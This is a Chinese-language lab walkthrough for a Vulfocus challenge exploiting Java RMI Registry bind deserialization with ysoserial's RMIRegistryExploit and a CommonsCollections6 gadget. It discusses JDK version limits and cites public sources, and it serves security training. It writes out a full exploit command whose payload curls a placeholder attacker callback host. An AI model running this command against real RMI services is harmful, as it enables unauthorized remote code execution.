# Java RMI Registry Bind 反序列化代码执行

> **题库信息：**题名 `java-rmi-registry-bind-deserialization 代码执行`；镜像 `vulfocus/java-rmi-registry-bind-deserialization:latest`；内部端口 `1099`；无 CVE。
>
> **一句话链路：**对符合该公开旧版环境条件的 RMI Registry，使用 ysoserial 的 `RMIRegistryExploit` 构造实现 `Remote` 的动态代理，将 Commons Collections gadget 随 `bind` 请求送入 Registry 反序列化并触发命令。[S1][S2][S3]
>
> 公开同名 Vulhub README 标题写 JDK 8u111 及以下并给出 `commons-collections:3.2.1` 的复现命令，但同目录 `docker-compose.yml` 指向 `vulhub/j2ee:8u131`。两份资料的版本信息不一致；因此下面是文档中的链路参考，不应说成已经确认可打通该公开环境，更不能推定 Vulfocus `latest` 使用相同构建。[S1][S5]

## 操作步骤

1. 在 Vulfocus 启动本题实例，记录页面给出的目标地址及映射端口。题库内部端口是 `1099`；同名 Vulhub compose 也映射 `1099:1099`，但实际连接时使用 Vulfocus 显示的映射端口。[S1][S5]
2. 在攻击机准备可运行的 ysoserial jar。确认其中包含 `ysoserial.exploit.RMIRegistryExploit` 和 `CommonsCollections6`；该利用器接收目标主机、端口、gadget 名和命令，并通过 `registry.bind()` 发送构造的 Remote 代理。[S1][S2]
3. 执行公开复现命令，将 `<目标地址>`、`<映射端口>` 和回连地址替换为当前实例与自己可接收请求的地址：

   ```bash
   java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit <目标地址> <映射端口> CommonsCollections6 "curl http://<可接收回连的地址>/rmi-bind-check"
   ```

   命令格式来自同名公开环境的复现；原文使用 `your-ip 1099 CommonsCollections6 "curl your-dnslog-server"`。[S1]
4. 查看回连服务是否收到请求。Registry 返回异常并不必然代表失败：公开复现特别说明，命令触发后 Registry 仍可能报错；因此应以回连现象判断这条命令是否执行，不要只看客户端异常文本。[S1]

## 本题特有排坑

- **版本资料有冲突，不能把标题当成镜像实况：**Vulhub README 标题写“≤8u111”，但同目录 compose 使用 `vulhub/j2ee:8u131`；Oracle 8u121 起给 RMI Registry 加入内置序列化白名单过滤，Anquanke 的分析也指出旧版 `RMIRegistryExploit` 的 Commons Collections 对象不在该白名单内。故即使远程 bind 的反序列化时序问题到 8u141 才调整，也不代表 CC6 经典链在 8u121–8u140 可用。Vulfocus 镜像运行时版本未确认；不能仅凭端口开放认定命令适用。[S1][S2][S4][S5]
- **`bind` 参数必须是 Remote 对象：**不是把 ysoserial 输出的序列化文件直接发到 TCP 端口。`RMIRegistryExploit` 会把 gadget 包装进实现 `Remote` 的代理后调用 Registry 的 `bind`。[S2][S3]
- **目标侧需要匹配的 gadget 依赖：**同名公开环境声明使用 `commons-collections:3.2.1`，但不能据此推定 Vulfocus 镜像一定相同；若 Registry 拒绝反序列化或 gadget 类不匹配，不要反复换成其他 RMI 利用链来冒充本题链路。[S1][S2]
- **区分两个地址：**命令中的目标地址/端口是 RMI Registry；`curl` 中的地址是攻击侧回连服务，必须能从目标环境访问。题库给的 `1099` 是镜像内部端口，外部映射以实例页面为准。[S1]

## 来源

- **[S1] 同名环境直接复现：**[Vulhub — Java ≤JDK 8u111 RMI Registry 反序列化命令执行](https://github.com/vulhub/vulhub/blob/master/java/rmi-registry-bind-deserialization/README.zh-cn.md) — 给出远程绑定反序列化原理、`commons-collections:3.2.1`、内部 `1099` 启动方式、`RMIRegistryExploit` 命令和“Registry 报错仍可能执行”的提示。此为同名公开环境，不证明 Vulfocus 镜像构建完全相同。
- **[S2] RMI Registry 技术分析：**[浅谈 Java RMI Registry 安全问题](https://www.anquanke.com/post/id/197829) — 文章说明 JDK 8u141 前 bind/rebind 在来源检查前完成反序列化，并指出 JDK 8u121 引入白名单过滤后，旧版 `RMIRegistryExploit` 的非白名单对象会被拒绝；本文只取 classic bind 链，不采用其他触发路径。
- **[S3] ysoserial 利用器源码：**[RMIRegistryExploit.java](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/RMIRegistryExploit.java) — 代码解析目标 host/port、gadget 与 command，创建 `Remote` 代理并调用 `registry.bind()`。
- **[S4] Oracle 版本边界：**[JDK 8u121 Release Notes — RMI Better Constraint Checking](https://www.oracle.com/java/technologies/javase/8u121-relnotes.html) — 说明 RMI Registry 与 DGC 引入 JEP 290 序列化过滤及内置白名单过滤器，用于判断经典 gadget 链的版本边界。
- **[S5] 同名环境 Compose 配置：**[Vulhub docker-compose.yml](https://raw.githubusercontent.com/vulhub/vulhub/master/java/rmi-registry-bind-deserialization/docker-compose.yml) — 指定镜像标签 `vulhub/j2ee:8u131` 并映射 `1099:1099`；这与 README 标题中的 `≤8u111` 有版本信息冲突，不能静默忽略。

来源清单：[`../sources/048_java-rmi-registry-bind-deserialization/_meta.md`](../sources/048_java-rmi-registry-bind-deserialization/_meta.md)



